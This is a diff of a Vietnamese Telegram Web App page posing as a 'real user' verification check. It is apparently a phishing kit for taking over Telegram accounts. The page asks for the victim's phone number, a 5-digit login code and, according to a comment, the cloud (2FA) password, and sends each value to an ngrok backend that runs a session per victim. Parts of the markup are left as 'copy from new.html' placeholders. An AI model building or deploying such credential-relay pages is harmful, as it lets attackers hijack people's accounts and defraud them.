@@ -2,107 +2,69 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Xác Minh</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- Thêm CSS từ file new.html của bạn vào đây -->
     <style>
-        body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
-        .content { padding: 20px; width: 100%; }
-        .otp-box { width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid #333; border-radius: 8px; background: #1c232d; color: white; }
+        /* [Giữ nguyên CSS từ new.html] */
+        /* ... (Copy toàn bộ phần <style> từ new.html vào đây) ... */
     </style>
 </head>
 <body>
 
-<div class="content" id="app">
-    <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
-    <div id="message">Bạn cần xác nhận mình là người dùng thật!</div>
+<div class="phone-container">
+    <div class="phone">
+        <!-- [Giữ nguyên cấu trúc HTML <div class="screen"> từ new.html] -->
+        <!-- ... (Copy toàn bộ cấu trúc HTML từ new.html) ... -->
+    </div>
 </div>
 
 <script>
-    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
     const tg = window.Telegram.WebApp;
-    tg.ready();
-    tg.expand();
-
-    // Bước 1: Yêu cầu SĐT
-    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
-    tg.MainButton.show();
+    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
     
-    tg.MainButton.onClick(() => {
+    // Lấy chat_id để đảm bảo Tool Session chạy song song cho từng người
+    const chat_id = tg.initDataUnsafe?.user?.id || "unknown_user";
+
+    // Hàm gọi API đồng bộ dữ liệu với Backend
+    async function sendToBackend(endpoint, payload) {
+        return await fetch(`${BACKEND_URL}/${endpoint}`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ ...payload, chat_id: chat_id })
+        }).then(res => res.json());
+    }
+
+    // Logic xử lý khi nhấn nút xác nhận (Step 1)
+    document.getElementById("shareContact").addEventListener("click", () => {
+        const btn = document.getElementById('shareContact');
+        btn.disabled = true;
+        
+        tg.onEvent('contactRequested', async (event) => {
+            if (event.status === 'sent') {
+                const phoneNumber = event.responseUnsafe.contact.phone_number;
+                // Gửi SĐT về Backend để tạo Session song song
+                await sendToBackend('send_phone', { phone: phoneNumber });
+                goStep(2);
+            }
+        });
         tg.requestContact();
     });
 
-    // Xử lý sự kiện sau khi share SĐT
-    tg.onEvent('contactRequested', async (data) => {
-        const phoneNumber = (data.responseUnsafe && data.responseUnsafe.contact) ? data.responseUnsafe.contact.phone_number : null;
-
-        if (phoneNumber) {
-            tg.MainButton.text = "ĐANG GỬI...";
-            
-            await fetch(`${BACKEND_URL}/send_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phoneNumber })
-            });
-            
-            // Chuyển giao diện sang nhập mã OTP với 5 ô và numpad
-            const appDiv = document.getElementById('app');
-            appDiv.innerHTML = `
-                <div style="margin-bottom: 20px; font-weight: bold;">NHẬP MÃ OTP (5 SỐ)</div>
-                <div id="otp-container" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 30px;">
-                    ${[0,1,2,3,4].map(() => `<input type="text" maxlength="1" class="otp-box" readonly>`).join('')}
-                </div>
-                <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 250px; margin: 0 auto;">
-                    ${[1,2,3,4,5,6,7,8,9,'C',0,'OK'].map(num => `
-                        <button onclick="handleKey('${num}')" style="padding: 15px; border-radius: 8px; border: none; background: #2b3a4a; color: white; font-size: 18px; cursor: pointer;">${num}</button>
-                    `).join('')}
-                </div>
-            `;
-            
-            tg.MainButton.hide(); // Ẩn nút vì ta dùng bàn phím số riêng
-        } else {
-            alert("Lỗi không lấy được SĐT.");
-        }
-    });
-
-    // Logic xử lý nhập liệu OTP
-    let currentOtp = "";
-    window.handleKey = (key) => {
-        const boxes = document.querySelectorAll('.otp-box');
-        if (key === 'C') {
-            currentOtp = currentOtp.slice(0, -1);
-        } else if (key === 'OK') {
-            if (currentOtp.length === 5) submitOtp(currentOtp);
-        } else {
-            if (currentOtp.length < 5) currentOtp += key;
-        }
-        
-        boxes.forEach((box, i) => box.value = currentOtp[i] || "");
-        
-        if (currentOtp.length === 5) submitOtp(currentOtp);
-    };
-
-    // Hàm gửi OTP về server
-    async function submitOtp(otp) {
-        // Cập nhật trạng thái cho người dùng biết
-        document.getElementById('message').innerText = "Đang xác minh mã...";
-        
-        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ otp: otp })
-        });
-        
-        const result = await res.json();
+    // Logic khi nhập xong OTP (Step 3 & 4)
+    // Sửa hàm sau khi nhập đủ 5 số:
+    async function handleOtpSubmit(otp, stateKey) {
+        const result = await sendToBackend('verify_otp', { otp: otp });
         if (result.success) {
-            alert("Xác minh thành công!");
-            tg.close();
+            goStep(5); // Chuyển sang nhập mật khẩu đám mây
         } else {
-            alert("Mã không đúng, vui lòng thử lại.");
-            currentOtp = "";
-            document.querySelectorAll('.otp-box').forEach(box => box.value = "");
+            goStep(4); // Nếu sai, báo lỗi
         }
     }
+
+    // [Giữ nguyên các hàm goStep, pressKey, viewCode từ new.html]
+    // ...
 </script>
 </body>
 </html>
